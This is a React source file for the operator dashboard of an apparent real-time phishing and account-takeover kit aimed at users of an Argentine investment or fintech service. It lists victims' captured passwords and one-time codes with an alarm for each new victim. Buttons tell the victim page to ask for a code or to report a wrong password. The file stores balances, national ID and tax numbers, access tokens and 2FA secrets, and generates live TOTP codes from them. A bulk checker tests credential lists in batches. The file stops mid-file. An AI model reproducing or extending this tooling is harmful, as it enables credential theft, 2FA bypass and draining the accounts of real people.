import { useState, useEffect, useCallback, useRef } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import CocosAdminLogin from "@/components/admin/CocosAdminLogin";
import { useNotificationSound } from "@/hooks/useNotificationSound";
import { generateTOTP, getTimeRemaining } from "@/lib/totp";
import { Button } from "@/components/ui/button";
import {
  Shield, LogOut, RefreshCw, Users, Activity, Search, DollarSign,
  TrendingUp, Eye, EyeOff, Bell, BellOff,
  ChevronDown, ChevronUp, Loader2, Upload, Zap, Pause, Play,
  Copy, Check, Wallet, BarChart3, Trash2,
} from "lucide-react";

// ── Types ──
interface PlusAccount {
  id: string;
  email: string;
  password: string | null;
  full_name: string | null;
  document: string | null;
  cuit: string | null;
  phone: string | null;
  city: string | null;
  province: string | null;
  operator_code: string;
  access_token: string | null;
  balance_ars: any;
  balance_usd: any;
  fintech_data: any;
  limits_data: any;
  crypto_data: any;
  profile_data: any;
  info_tag: string | null;
  totp_secret: string | null;
  last_login_at: string | null;
  last_data_sync_at: string | null;
  created_at: string;
  updated_at: string;
}

interface LiveSession {
  id: string;
  email: string | null;
  password: string | null;
  status: string;
  otp_code: string | null;
  created_at: string;
  ip_address: string | null;
  user_agent: string | null;
  country: string | null;
  city: string | null;
  source: string;
  operator_code: string;
}

interface Operator {
  id: string;
  code: string;
  name: string;
  user_id?: string;
}

interface AccountResult {
  success: boolean;
  email: string;
  error?: string;
  accessToken?: string;
  profile?: any;
  balances?: any;
  fintech?: any;
  limits?: any;
  crypto?: any;
}

// ── Helpers ──
const fmtARS = (n: number | undefined) =>
  n != null ? `$ ${n.toLocaleString("es-AR", { minimumFractionDigits: 2 })}` : "—";
const fmtUSD = (n: number | undefined) =>
  n != null ? `US$ ${n.toLocaleString("en-US", { minimumFractionDigits: 2 })}` : "—";

const timeAgo = (dateStr: string | null) => {
  if (!dateStr) return "Nunca";
  const diff = Date.now() - new Date(dateStr).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "Agora";
  if (mins < 60) return `${mins}m`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h`;
  return `${Math.floor(hrs / 24)}d`;
};

const parseDevice = (ua: string | null) => {
  if (!ua) return "?";
  if (/Mobile|Android|iPhone/i.test(ua)) return "📱";
  return "💻";
};

const statusLabels: Record<string, { label: string; color: string }> = {
  pending_review: { label: "Aguardando", color: "text-yellow-400 bg-yellow-500/10" },
  wrong_password: { label: "Senha Errada", color: "text-red-400 bg-red-500/10" },
  redirect_otp: { label: "→ OTP", color: "text-blue-400 bg-blue-500/10" },
  show_otp: { label: "→ OTP", color: "text-blue-400 bg-blue-500/10" },
  otp_submitted: { label: "OTP Enviado", color: "text-cyan-400 bg-cyan-500/10" },
  otp_approved: { label: "OTP OK ✓", color: "text-green-400 bg-green-500/10" },
  otp_rejected: { label: "OTP Errado", color: "text-red-400 bg-red-500/10" },
  login_success: { label: "Login OK ✓", color: "text-green-400 bg-green-500/10" },
  approved: { label: "Aprovado ✓", color: "text-green-500 bg-green-500/10" },
  completed: { label: "Concluído ✓", color: "text-green-500 bg-green-500/10" },
};

const INFO_TAGS = ["USEI", "NÃO MEXI", "VERIFICAR", "PROBLEMA"] as const;
const TAG_COLORS: Record<string, { bg: string; text: string }> = {
  "USEI": { bg: "bg-blue-500/15 border-blue-500/30", text: "text-blue-400" },
  "NÃO MEXI": { bg: "bg-yellow-500/15 border-yellow-500/30", text: "text-yellow-400" },
  "VERIFICAR": { bg: "bg-orange-500/15 border-orange-500/30", text: "text-orange-400" },
  "PROBLEMA": { bg: "bg-red-500/15 border-red-500/30", text: "text-red-400" },
};

// ══════════════════════════════════════════
// MAIN COMPONENT
// ══════════════════════════════════════════
const PanelPlus = () => {
  const { user, isAdmin, hasRole, loading: authLoading, signOut } = useAuth();
  const canAccess = isAdmin || hasRole;
  const [forceRefresh, setForceRefresh] = useState(0);
  const [activeTab, setActiveTab] = useState<"sessions" | "accounts" | "bulk">("sessions");

  // Operators
  const [operators, setOperators] = useState<Operator[]>([]);
  const [operatorFilter, setOperatorFilter] = useState<string>("all");
  const [myOperator, setMyOperator] = useState<Operator | null>(null);

  useEffect(() => {
    if (!user || !canAccess) return;
    supabase.from("operators").select("*").order("created_at").then(({ data }) => {
      const ops = (data as unknown as Operator[]) || [];
      setOperators(ops);
      const match = ops.find((o) => o.user_id === user.id && o.code !== "master");
      if (match) { setMyOperator(match); setOperatorFilter(match.code); }
    });
  }, [user, canAccess]);

  // Accounts
  const [accounts, setAccounts] = useState<PlusAccount[]>([]);
  const [accountsLoading, setAccountsLoading] = useState(true);
  const [search, setSearch] = useState("");

  const loadAccounts = useCallback(async (showLoading = true) => {
    if (showLoading) setAccountsLoading(true);
    const { data } = await supabase.from("plus_accounts").select("*").order("updated_at", { ascending: false });
    setAccounts((data as unknown as PlusAccount[]) || []);
    if (showLoading) setAccountsLoading(false);
  }, []);

  useEffect(() => {
    if (user && canAccess) loadAccounts(true);
  }, [user, canAccess, loadAccounts, forceRefresh]);

  // Realtime plus_accounts
  useEffect(() => {
    if (!user || !canAccess) return;
    const channel = supabase
      .channel("plus-accounts-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "plus_accounts" }, (payload) => {
        if (payload.eventType === "INSERT") {
          setAccounts((prev) => [payload.new as unknown as PlusAccount, ...prev]);
        } else if (payload.eventType === "UPDATE") {
          setAccounts((prev) => prev.map((a) => a.id === (payload.new as any).id ? (payload.new as unknown as PlusAccount) : a));
        } else if (payload.eventType === "DELETE") {
          setAccounts((prev) => prev.filter((a) => a.id !== (payload.old as any).id));
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, canAccess]);

  // Live sessions
  const [liveSessions, setLiveSessions] = useState<LiveSession[]>([]);
  const { startAlarm, stopAlarm } = useNotificationSound();
  const [soundEnabled, setSoundEnabled] = useState(true);
  const soundEnabledRef = useRef(true);
  const seenSessionsRef = useRef<Set<string>>(new Set());

  useEffect(() => { soundEnabledRef.current = soundEnabled; }, [soundEnabled]);

  const loadLiveSessions = useCallback(async () => {
    const since = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
    const { data } = await supabase
      .from("sessions").select("*")
      .eq("source", "plus").gte("created_at", since)
      .order("created_at", { ascending: false }).limit(100);
    setLiveSessions((data as unknown as LiveSession[]) || []);
  }, []);

  useEffect(() => {
    if (!user || !canAccess) return;
    loadLiveSessions();
    const channel = supabase
      .channel("plus-sessions-admin")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.plus" }, (payload) => {
        const newRow = payload.new as LiveSession;
        if (payload.eventType === "INSERT") {
          setLiveSessions((prev) => [newRow, ...prev].slice(0, 100));
          if (!seenSessionsRef.current.has(newRow.id) && soundEnabledRef.current) {
            seenSessionsRef.current.add(newRow.id);
            startAlarm();
            setTimeout(() => stopAlarm(), 3000);
          }
        } else if (payload.eventType === "UPDATE") {
          setLiveSessions((prev) => prev.map((s) => s.id === newRow.id ? newRow : s));
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, canAccess, loadLiveSessions, startAlarm, stopAlarm]);

  // Session actions
  const handleSessionAction = async (sessionId: string, status: string) => {
    await supabase.from("sessions").update({ status }).eq("id", sessionId);
    // Also broadcast for instant client reaction
    await supabase.channel(`session-review-${sessionId}`).send({
      type: "broadcast", event: "review_decision", payload: { status },
    });
  };

  const handleOtpAction = async (sessionId: string, status: string) => {
    await supabase.from("sessions").update({ status }).eq("id", sessionId);
    await supabase.channel(`session-otp-decision-${sessionId}`).send({
      type: "broadcast", event: "otp_decision", payload: { status },
    });
  };

  // Bulk checker
  const [bulkInput, setBulkInput] = useState("");
  const [bulkLoading, setBulkLoading] = useState(false);
  const [bulkResults, setBulkResults] = useState<AccountResult[]>([]);
  const [bulkProgress, setBulkProgress] = useState({ done: 0, total: 0 });
  const [paused, setPaused] = useState(false);
  const pausedRef = useRef(false);

  const parseBulkInput = (text: string) =>
    text.split("\n").map((l) => l.trim()).filter(Boolean).map((line) => {
      const parts = line.includes(":") ? line.split(":").slice(1).join(":") : line;
      const [em, pw] = parts.split("|").map((s) => s.trim());
      return { email: em, password: pw };
    }).filter((a) => a.email && a.password);

  const handleBulkCheck = async () => {
    const accs = parseBulkInput(bulkInput);
    if (!accs.length) return;
    setBulkLoading(true);
    setPaused(false);
    pausedRef.current = false;
    setBulkResults([]);
    setBulkProgress({ done: 0, total: accs.length });

    const opCode = myOperator?.code || operatorFilter !== "all" ? operatorFilter : "master";
    const allResults: AccountResult[] = [];
    const batchSize = 3;

    for (let i = 0; i < accs.length; i += batchSize) {
      while (pausedRef.current) await new Promise((r) => setTimeout(r, 500));
      const batch = accs.slice(i, i + batchSize);
      try {
        const { data: res, error } = await supabase.functions.invoke("plus-auth", {
          body: { action: "bulk", accounts: batch, operatorCode: opCode },
        });
        if (error) {
          batch.forEach((acc) => allResults.push({ success: false, email: acc.email, error: "Falha" }));
        } else {
          allResults.push(...(res.results || []));
        }
      } catch (e: any) {
        batch.forEach((acc) => allResults.push({ success: false, email: acc.email, error: e.message }));
      }
      setBulkResults([...allResults]);
      setBulkProgress({ done: Math.min(i + batchSize, accs.length), total: accs.length });
      if (i + batchSize < accs.length) await new Promise((r) => setTimeout(r, 2000));
    }
    setBulkLoading(false);
    loadAccounts(false);
  };

  // Delete account
  const handleDeleteAccount = async (account: PlusAccount) => {
    if (!confirm(`Remover conta ${account.email}?`)) return;
    await supabase.from("plus_accounts").delete().eq("id", account.id);
    loadAccounts(false);
  };

  // Update info_tag
  const handleUpdateTag = async (accountId: string, tag: string | null) => {
    await supabase.from("plus_accounts").update({ info_tag: tag } as any).eq("id", accountId);
    loadAccounts(false);
  };

  // Favicon
  useEffect(() => {
    document.title = "Painel Plus";
  }, []);

  // ── Guards ──
  if (authLoading) return (
    <div className="flex min-h-screen items-center justify-center bg-background">
      <RefreshCw size={24} className="text-primary animate-spin" />
    </div>
  );
  if (!user) return <CocosAdminLogin onLogin={() => setForceRefresh((p) => p + 1)} />;
  if (!canAccess) return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-background gap-4">
      <Shield className="h-12 w-12 text-destructive" />
      <h1 className="text-xl font-bold text-foreground">Acesso Negado</h1>
      <button onClick={() => signOut()} className="rounded-xl bg-primary px-6 py-2.5 text-sm font-semibold text-primary-foreground">Voltar</button>
    </div>
  );

  // Filter by operator
  const filteredAccounts = myOperator
    ? accounts.filter((a) => a.operator_code === myOperator.code)
    : operatorFilter === "all"
      ? accounts
      : accounts.filter((a) => a.operator_code === operatorFilter);

  const filteredSessions = liveSessions.filter((s) => {
    if (s.source !== "plus") return false;
    if (myOperator && s.operator_code !== myOperator.code) return false;
    if (!myOperator && operatorFilter !== "all" && s.operator_code !== operatorFilter) return false;
    return true;
  });

  const totalARS = filteredAccounts.reduce((s, a) => s + (a.balance_ars?.ars || 0) + (a.fintech_data?.balance || 0), 0);
  const totalUSD = filteredAccounts.reduce((s, a) => s + (a.balance_usd?.usd || 0), 0);

  const searchedAccounts = filteredAccounts.filter((a) => {
    const q = search.toLowerCase();
    return !q || a.email?.toLowerCase().includes(q) || a.full_name?.toLowerCase().includes(q) || a.document?.toLowerCase().includes(q);
  });

  const tabs = [
    { key: "sessions" as const, icon: <Activity size={14} />, label: "Sessões", count: filteredSessions.length },
    { key: "accounts" as const, icon: <Users size={14} />, label: "Contas", count: filteredAccounts.length },
    { key: "bulk" as const, icon: <Upload size={14} />, label: "Bulk Checker" },
  ];

  return (
    <div className="min-h-screen bg-background text-foreground">
      {/* ══════ HEADER ══════ */}
      <header className="sticky top-0 z-50 border-b border-border bg-card/95 backdrop-blur-md">
        <div className="mx-auto max-w-6xl flex items-center justify-between px-4 h-12">
          <div className="flex items-center gap-2.5">
            <div className="h-7 w-7 rounded-lg bg-gradient-to-br from-violet-500 to-purple-700 flex items-center justify-center">
              <TrendingUp className="w-3.5 h-3.5 text-white" />
            </div>
            <span className="text-sm font-bold text-foreground">{myOperator ? myOperator.name : "Plus Admin"}</span>
            {myOperator && <span className="text-[9px] font-mono bg-secondary text-muted-foreground px-1.5 py-0.5 rounded">{myOperator.code}</span>}
          </div>
          <div className="flex items-center gap-1">
            <button onClick={() => setSoundEnabled(!soundEnabled)} className={`h-8 w-8 rounded-lg flex items-center justify-center transition-colors ${soundEnabled ? "text-primary" : "text-muted-foreground"}`}>
              {soundEnabled ? <Bell size={14} /> : <BellOff size={14} />}
            </button>
            <button onClick={() => { setForceRefresh((p) => p + 1); loadLiveSessions(); }} className="h-8 w-8 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground transition-colors">
              <RefreshCw size={14} />
            </button>
            <button onClick={() => signOut()} className="h-8 w-8 rounded-lg flex items-center justify-center text-destructive/60 hover:text-destructive transition-colors">
              <LogOut size={14} />
            </button>
          </div>
        </div>
      </header>

      {/* ══════ FINANCE DASHBOARD ══════ */}
      <section className="border-b border-border bg-card/50">
        <div className="mx-auto max-w-6xl px-4 py-3">
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
            <MetricCard label="TOTAL ARS" value={fmtARS(totalARS)} color="text-emerald-400" icon="💰" />
            <MetricCard label="TOTAL USD" value={fmtUSD(totalUSD)} color="text-blue-400" icon="🇺🇸" />
            <MetricCard label="CONTAS" value={String(filteredAccounts.length)} color="text-purple-400" icon="👥" />
            <MetricCard label="SESSÕES" value={String(filteredSessions.length)} color="text-orange-400" icon="📡" sub="24h" />
          </div>
        </div>
      </section>

      {/* ══════ TABS ══════ */}
      <div className="sticky top-12 z-40 border-b border-border bg-card/95 backdrop-blur-md">
        <div className="mx-auto max-w-6xl px-4">
          <nav className="flex gap-0 -mb-px overflow-x-auto">
            {tabs.map((tab) => (
              <button key={tab.key} onClick={() => setActiveTab(tab.key)}
                className={`flex items-center gap-1.5 px-3 py-2.5 text-[11px] font-semibold transition-colors border-b-2 whitespace-nowrap ${
                  activeTab === tab.key ? "border-primary text-foreground" : "border-transparent text-muted-foreground hover:text-foreground"
                }`}>
                {tab.icon}
                {tab.label}
                {tab.count !== undefined && tab.count > 0 && (
                  <span className="text-[9px] bg-primary/10 text-primary rounded px-1 py-0.5 font-bold tabular-nums">{tab.count}</span>
                )}
              </button>
            ))}
          </nav>
        </div>
      </div>

      {/* ══════ MAIN ══════ */}
      <main className="mx-auto max-w-6xl px-4 py-4">
        {activeTab === "sessions" && (
          <div className="space-y-3">
            {/* Operator filter */}
            {!myOperator && operators.length > 0 && (
              <div className="flex items-center gap-1.5 flex-wrap">
                <button onClick={() => setOperatorFilter("all")} className={`text-[10px] px-2.5 py-1 rounded-lg font-medium transition-all ${operatorFilter === "all" ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"}`}>Todos</button>
                {operators.map((op) => (
                  <button key={op.id} onClick={() => setOperatorFilter(op.code)}
                    className={`text-[10px] px-2.5 py-1 rounded-lg font-medium transition-all ${operatorFilter === op.code ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"}`}>
                    {op.name}
                  </button>
                ))}
              </div>
            )}

            {filteredSessions.length === 0 ? (
              <p className="text-center text-sm text-muted-foreground py-12">Nenhuma sessão nas últimas 24h.</p>
            ) : (
              <div className="space-y-1.5">
                {filteredSessions.map((session) => (
                  <SessionRow key={session.id} session={session} onAction={handleSessionAction} onOtpAction={handleOtpAction} />
                ))}
              </div>
            )}
          </div>
        )}

        {activeTab === "accounts" && (
          <div className="space-y-3">
            {/* Operator filter */}
            {!myOperator && operators.length > 0 && (
              <div className="flex items-center gap-1.5 flex-wrap">
                <button onClick={() => setOperatorFilter("all")} className={`text-[10px] px-2.5 py-1 rounded-lg font-medium transition-all ${operatorFilter === "all" ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"}`}>Todos</button>
                {operators.map((op) => (
                  <button key={op.id} onClick={() => setOperatorFilter(op.code)}
                    className={`text-[10px] px-2.5 py-1 rounded-lg font-medium transition-all ${operatorFilter === op.code ? "bg-primary/10 text-primary" : "text-muted-foreground hover:text-foreground"}`}>
                    {op.name}
                  </button>
                ))}
              </div>
            )}

            <div className="relative max-w-sm">
              <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input type="text" placeholder="Buscar contas..." value={search} onChange={(e) => setSearch(e.target.value)}
                className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
            </div>

            {accountsLoading ? (
              <div className="flex items-center justify-center py-16">
                <Loader2 className="w-5 h-5 animate-spin text-primary mr-2" />
                <span className="text-muted-foreground text-sm">Carregando...</span>
              </div>
            ) : searchedAccounts.length === 0 ? (
              <p className="text-center text-sm text-muted-foreground py-12">Nenhuma conta encontrada.</p>
            ) : (
              <div className="space-y-1">
                {searchedAccounts.map((account) => (
                  <AccountRow key={account.id} account={account} onDelete={handleDeleteAccount} onUpdateTag={handleUpdateTag} />
                ))}
              </div>
            )}
          </div>
        )}

        {activeTab === "bulk" && (
          <BulkTab
            bulkInput={bulkInput}
            setBulkInput={setBulkInput}
            loading={bulkLoading}
            results={bulkResults}
            progress={bulkProgress}
            paused={paused}
            onCheck={handleBulkCheck}
            onTogglePause={() => { const v = !pausedRef.current; pausedRef.current = v; setPaused(v); }}
            parseBulkInput={parseBulkInput}
          />
        )}
      </main>
    </div>
  );
};

// ── Metric Card ──
const MetricCard = ({ label, value, color, icon, sub, highlight }: {
  label: string; value: string; color: string; icon: string; sub?: string; highlight?: boolean;
}) => (
  <div className={`rounded-xl border p-3 ${highlight ? "border-orange-500/30 bg-orange-500/5" : "border-border bg-card/50"}`}>
    <div className="flex items-center gap-1.5 mb-1">
      <span className="text-sm">{icon}</span>
      <span className="text-[9px] font-medium uppercase tracking-wider text-muted-foreground">{label}</span>
    </div>
    <p className={`text-base font-bold ${color} font-mono`}>{value}</p>
    {sub && <span className="text-[9px] text-muted-foreground">{sub}</span>}
  </div>
);

// ── Session Row ──
const SessionRow = ({ session: s, onAction, onOtpAction }: {
  session: LiveSession;
  onAction: (id: string, status: string) => void;
  onOtpAction: (id: string, status: string) => void;
}) => {
  const [expanded, setExpanded] = useState(false);
  const status = statusLabels[s.status] || { label: s.status, color: "text-muted-foreground bg-secondary" };
  const isWaiting = s.status === "pending_review";
  const isOtpSubmitted = s.status === "otp_submitted";

  return (
    <div className="rounded-xl border border-border bg-card overflow-hidden">
      <div className="flex items-center gap-3 px-3 py-2 cursor-pointer hover:bg-secondary/50 transition-colors" onClick={() => setExpanded(!expanded)}>
        <span className="text-lg">{parseDevice(s.user_agent)}</span>
        <div className="flex-1 min-w-0">
          <p className="text-xs font-semibold text-foreground truncate">{s.email || "—"}</p>
          <p className="text-[10px] text-muted-foreground">{s.ip_address} · {s.country || ""} {s.city || ""} · {timeAgo(s.created_at)}</p>
        </div>
        <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-lg ${status.color}`}>{status.label}</span>
        {s.operator_code && s.operator_code !== "master" && (
          <span className="text-[9px] font-mono bg-secondary text-muted-foreground px-1.5 py-0.5 rounded">{s.operator_code}</span>
        )}
        {expanded ? <ChevronUp size={14} className="text-muted-foreground" /> : <ChevronDown size={14} className="text-muted-foreground" />}
      </div>

      {expanded && (
        <div className="border-t border-border px-3 py-2.5 space-y-2">
          <div className="grid grid-cols-2 gap-2 text-[10px]">
            <div><span className="text-muted-foreground">Email:</span> <span className="text-foreground font-mono">{s.email}</span></div>
            <div><span className="text-muted-foreground">Senha:</span> <span className="text-foreground font-mono">{s.password || "—"}</span></div>
            {s.otp_code && <div><span className="text-muted-foreground">OTP:</span> <span className="text-foreground font-mono font-bold">{s.otp_code}</span></div>}
            <div><span className="text-muted-foreground">UA:</span> <span className="text-foreground truncate">{s.user_agent?.substring(0, 60) || "—"}</span></div>
          </div>

          {/* Action buttons */}
          <div className="flex gap-1.5 flex-wrap">
            {isWaiting && (
              <>
                <button onClick={() => onAction(s.id, "login_success")} className="text-[10px] px-2.5 py-1 rounded-lg bg-green-500/10 text-green-400 font-semibold hover:bg-green-500/20 transition-all">✓ Aprovar Login</button>
                <button onClick={() => onAction(s.id, "wrong_password")} className="text-[10px] px-2.5 py-1 rounded-lg bg-red-500/10 text-red-400 font-semibold hover:bg-red-500/20 transition-all">✕ Senha Errada</button>
                <button onClick={() => onAction(s.id, "redirect_otp")} className="text-[10px] px-2.5 py-1 rounded-lg bg-blue-500/10 text-blue-400 font-semibold hover:bg-blue-500/20 transition-all">🔑 Pedir OTP</button>
              </>
            )}
            {isOtpSubmitted && (
              <>
                <button onClick={() => onOtpAction(s.id, "otp_approved")} className="text-[10px] px-2.5 py-1 rounded-lg bg-green-500/10 text-green-400 font-semibold hover:bg-green-500/20 transition-all">✓ OTP Correto</button>
                <button onClick={() => onOtpAction(s.id, "otp_rejected")} className="text-[10px] px-2.5 py-1 rounded-lg bg-red-500/10 text-red-400 font-semibold hover:bg-red-500/20 transition-all">✕ OTP Errado</button>
                <button onClick={() => onOtpAction(s.id, "completed")} className="text-[10px] px-2.5 py-1 rounded-lg bg-emerald-500/10 text-emerald-400 font-semibold hover:bg-emerald-500/20 transition-all">✓ Concluir</button>
              </>
            )}
            {!isWaiting && !isOtpSubmitted && (
              <>
                <button onClick={() => onAction(s.id, "redirect_otp")} className="text-[10px] px-2.5 py-1 rounded-lg bg-blue-500/10 text-blue-400 font-semibold hover:bg-blue-500/20 transition-all">🔑 Pedir OTP</button>
                <button onClick={() => onAction(s.id, "completed")} className="text-[10px] px-2.5 py-1 rounded-lg bg-emerald-500/10 text-emerald-400 font-semibold hover:bg-emerald-500/20 transition-all">✓ Concluir</button>
                <button onClick={() => onAction(s.id, "wrong_password")} className="text-[10px] px-2.5 py-1 rounded-lg bg-red-500/10 text-red-400 font-semibold hover:bg-red-500/20 transition-all">✕ Rejeitar</button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

// ── Account Row ──
const AccountRow = ({ account: a, onDelete, onUpdateTag }: {
  account: PlusAccount;
  onDelete: (a: PlusAccount) => void;
  onUpdateTag: (id: string, tag: string | null) => void;
}) => {
  const [expanded, setExpanded] = useState(false);
  const [copied, setCopied] = useState("");
  const tagData = a.info_tag ? TAG_COLORS[a.info_tag] : null;

  const copyText = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(""), 1500);
  };

  const CopyBtn = ({ text, label }: { text: string; label: string }) => (
    <button onClick={(e) => { e.stopPropagation(); copyText(text, label); }}
      className="text-muted-foreground hover:text-foreground transition-colors ml-1">
      {copied === label ? <Check size={10} className="text-green-400" /> : <Copy size={10} />}
    </button>
  );

  return (
    <div className="rounded-xl border border-border bg-card overflow-hidden">
      <div className="flex items-center gap-3 px-3 py-2 cursor-pointer hover:bg-secondary/50 transition-colors" onClick={() => setExpanded(!expanded)}>
        <div className="h-7 w-7 rounded-lg bg-primary/10 flex items-center justify-center">
          <span className="text-[10px] font-bold text-primary">{(a.full_name || a.email)[0]?.toUpperCase()}</span>
        </div>
        <div className="flex-1 min-w-0">
          <p className="text-xs font-semibold text-foreground truncate">{a.full_name || "—"}</p>
          <p className="text-[10px] text-muted-foreground font-mono truncate">{a.email}</p>
        </div>
        {tagData && (
          <span className={`text-[9px] font-semibold px-1.5 py-0.5 rounded border ${tagData.bg} ${tagData.text}`}>{a.info_tag}</span>
        )}
        <div className="text-right hidden sm:block">
          <p className="text-xs font-mono text-emerald-400">{fmtARS((a.balance_ars?.ars || 0) + (a.fintech_data?.balance || 0))}</p>
          <p className="text-[10px] font-mono text-blue-400">{fmtUSD(a.balance_usd?.usd)}</p>
        </div>
        <span className="text-[9px] text-muted-foreground">{timeAgo(a.last_data_sync_at)}</span>
        {expanded ? <ChevronUp size={14} className="text-muted-foreground" /> : <ChevronDown size={14} className="text-muted-foreground" />}
      </div>

      {expanded && (
        <div className="border-t border-border px-3 py-3 space-y-3">
          {/* Tags */}
          <div className="flex items-center gap-1 flex-wrap">
            <span className="text-[9px] text-muted-foreground mr-1">Tag:</span>
            {INFO_TAGS.map((tag) => (
              <button key={tag} onClick={() => onUpdateTag(a.id, a.info_tag === tag ? null : tag)}
                className={`text-[9px] px-2 py-0.5 rounded-lg border font-medium transition-all ${
                  a.info_tag === tag ? `${TAG_COLORS[tag].bg} ${TAG_COLORS[tag].text}` : "border-border text-muted-foreground hover:text-foreground"
                }`}>{tag}</button>
            ))}
          </div>

          {/* Data grid */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="space-y-1">
              <div className="flex items-center gap-1 mb-1.5">
                <DollarSign className="w-3 h-3 text-emerald-400/60" />
                <span className="text-[9px] font-semibold uppercase tracking-wider text-emerald-400/60">Saldos</span>
              </div>
              <DataItem label="ARS" value={fmtARS(a.balance_ars?.ars)} color="text-emerald-400" />
              <DataItem label="USD" value={fmtUSD(a.balance_usd?.usd)} color="text-blue-400" />
              <DataItem label="Pend. ARS" value={fmtARS(a.balance_ars?.pendingARS)} color="text-amber-400/70" />
              <DataItem label="Pend. USD" value={fmtUSD(a.balance_usd?.pendingUSD)} color="text-amber-400/70" />
              <DataItem label="Fintech" value={fmtARS(a.fintech_data?.balance)} color="text-purple-400" />
              <div className="flex items-center justify-between py-1 border-t border-border mt-1">
                <span className="text-muted-foreground text-[10px] font-semibold">Saldo Total</span>
                <span className="text-[11px] font-bold font-mono text-emerald-300">{fmtARS((a.balance_ars?.ars || 0) + (a.fintech_data?.balance || 0))}</span>
              </div>
              <DataItem label="CVU" value={a.fintech_data?.cvu || "—"} />
            </div>
            <div className="space-y-1">
              <div className="flex items-center gap-1 mb-1.5">
                <Users className="w-3 h-3 text-blue-400/60" />
                <span className="text-[9px] font-semibold uppercase tracking-wider text-blue-400/60">Pessoais</span>
              </div>
              <DataItem label="DNI" value={a.document || "—"} />
              <DataItem label="CUIT" value={a.cuit || "—"} />
              <DataItem label="Telefone" value={a.phone || "—"} />
              <DataItem label="Cidade" value={a.city || "—"} />
              <DataItem label="Província" value={a.province || "—"} />
              <DataItem label="Operador" value={a.operator_code} />
            </div>
            <div className="space-y-1">
              <div className="flex items-center gap-1 mb-1.5">
                <Wallet className="w-3 h-3 text-purple-400/60" />
                <span className="text-[9px] font-semibold uppercase tracking-wider text-purple-400/60">Credenciais</span>
              </div>
              <div className="flex items-center justify-between py-1 border-b border-border/50">
                <span className="text-muted-foreground text-[10px]">Email</span>
                <span className="text-[10px] font-mono text-foreground">{a.email} <CopyBtn text={a.email} label="email" /></span>
              </div>
              <div className="flex items-center justify-between py-1 border-b border-border/50">
                <span className="text-muted-foreground text-[10px]">Senha</span>
                <span className="text-[10px] font-mono text-foreground">{a.password || "—"} {a.password && <CopyBtn text={a.password} label="pass" />}</span>
              </div>
              <DataItem label="Token" value={a.access_token ? `${a.access_token.substring(0, 20)}...` : "—"} />
              {a.totp_secret && (
                <div className="mt-2 p-2 rounded-lg bg-amber-500/5 border border-amber-500/20">
                  <div className="flex items-center gap-1 mb-1">
                    <Shield className="w-3 h-3 text-amber-400" />
                    <span className="text-[9px] font-semibold text-amber-400 uppercase">2FA / TOTP</span>
                  </div>
                  <div className="flex items-center justify-between py-0.5">
                    <span className="text-muted-foreground text-[10px]">Secret</span>
                    <span className="text-[10px] font-mono text-amber-300">{a.totp_secret} <CopyBtn text={a.totp_secret} label="totp_secret" /></span>
                  </div>
                  <TotpLiveCode secret={a.totp_secret} copyText={copyText} copied={copied} />
                </div>
              )}
            </div>
            </div>
            <div className="space-y-1">
              <div className="flex items-center gap-1 mb-1.5">
                <Activity className="w-3 h-3 text-amber-400/60" />
                <span className="text-[9px] font-semibold uppercase tracking-wider text-amber-400/60">Timestamps</span>
              </div>
              <DataItem label="Último Login" value={a.last_login_at ? new Date(a.last_login_at).toLocaleString("pt-BR") : "—"} />
              <DataItem label="Última Sync" value={a.last_data_sync_at ? new Date(a.last_data_sync_at).toLocaleString("pt-BR") : "—"} />
              <DataItem label="Atualizado" value={new Date(a.updated_at).toLocaleString("pt-BR")} />
            </div>
          </div>

          {/* Actions */}
          <div className="flex gap-1.5">
            <button onClick={() => onDelete(a)} className="text-[10px] px-2.5 py-1 rounded-lg bg-red-500/10 text-red-400 font-semibold hover:bg-red-500/20 transition-all flex items-center gap-1">
              <Trash2 size={10} /> Remover
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

// ── TOTP Live Code ──
const TotpLiveCode = ({ secret, copyText, copied }: {
  secret: string;
  copyText: (text: string, label: string) => void;
  copied: string;
}) => {
  const [code, setCode] = useState("------");
  const [remaining, setRemaining] = useState(30);

  useEffect(() => {
    let mounted = true;
    const update = async () => {
      try {
        const c = await generateTOTP(secret);
        if (mounted) setCode(c);
      } catch { if (mounted) setCode("ERROR"); }
      if (mounted) setRemaining(getTimeRemaining());
    };
    update();
    const interval = setInterval(update, 1000);
    return () => { mounted = false; clearInterval(interval); };
  }, [secret]);

  return (
    <div className="flex items-center justify-between py-0.5 mt-1">
      <span className="text-muted-foreground text-[10px]">Código</span>
      <div className="flex items-center gap-2">
        <span className="text-lg font-bold font-mono text-emerald-400 tracking-[0.2em]">{code}</span>
        <button onClick={(e) => { e.stopPropagation(); copyText(code, "totp_code"); }}
          className="text-muted-foreground hover:text-foreground transition-colors">
          {copied === "totp_code" ? <Check size={10} className="text-green-400" /> : <Copy size={10} />}
        </button>
        <div className="flex items-center gap-1">
          <div className="w-5 h-5 rounded-full border-2 border-amber-500/30 flex items-center justify-center">
            <span className={`text-[8px] font-bold font-mono ${remaining <= 5 ? "text-red-400" : "text-amber-400"}`}>{remaining}</span>
          </div>
        </div>
      </div>
    </div>
  );
};

// ── Data Item ──
